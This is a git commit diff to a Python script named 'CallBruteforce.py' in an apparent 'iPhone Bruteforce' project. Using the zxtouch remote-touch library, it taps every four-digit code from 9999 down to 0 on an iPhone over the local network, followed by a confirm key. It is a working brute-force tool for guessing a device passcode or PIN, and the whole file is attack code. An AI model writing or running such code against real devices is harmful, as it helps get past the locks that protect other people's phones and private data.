d7260111f0e8b5f2710793ea26214bffcc89f7ec
Fabián <55326869+Transhacks@users.noreply.github.com>
2023-01-11 17:29:41 -0500

    Update CallBruteforce.py

--- iPhone Bruteforce/CallBruteforce.py
+++ iPhone Bruteforce/CallBruteforce.py
@@ -2,47 +2,35 @@ from zxtouch.client import zxtouch
 from zxtouch.touchtypes import *
 import time
 
-A0 = (410) 
-AA0 = (1260)
-A1 = (170)
-AA1 = (660)
-A2 = (410)
-AA2 =(650)
-A3 = (640)
-AA3 = (650)
-A4 = (170)
-AA4 = (860)
-A5 = (410)
-AA5 = (860)
-A6 = (640)
-AA6 = (860)
-A7 = (170)
-AA7 = (1060)
-A8 = (410)
-AA8 = (1060)
-A9 = (640)
-AA9 = (1060)
-AA = (640)
-AAA = (1260)
+A0 = (410, 1260) 
+A1 = (170, 660)
+A2 = (410, 650)
+A3 = (640, 650)
+A4 = (170, 860)
+A5 = (410, 860)
+A6 = (640, 860)
+A7 = (170, 1060)
+A8 = (410, 1060)
+A9 = (640, 1060)
+AA = (640, 1260)
 
-device = zxtouch("192.168.1.3")
+device = zxtouch("192.168.1.9")
 
 time.sleep(2)
 
-for i in range(8230, -1, -1):
+for i in range(9999, -1, -1):
     number_str = str(i).zfill(4)
     
     for digit in number_str:
-        x, y = globals()[f"A{digit}"], globals()[f"AA{digit}"]
+        coord = globals()[f"A{digit}"]
         
-        device.touch(TOUCH_DOWN, 1, x, y)
+        device.touch(TOUCH_DOWN, 1, coord[0], coord[1])
         time.sleep(0.2)
-        device.touch(TOUCH_UP, 1, x, y)
+        device.touch(TOUCH_UP, 1, coord[0], coord[1])
         time.sleep(0.2)
-    
-    device.touch(TOUCH_DOWN, 1, AA, AAA)
+
+    device.touch(TOUCH_DOWN, 1, AA[0], AA[1])
     time.sleep(0.2)
-    device.touch(TOUCH_UP, 1, AA, AAA)
+    device.touch(TOUCH_UP, 1, AA[0], AA[1])
     time.sleep(2)
     print(i)
-    
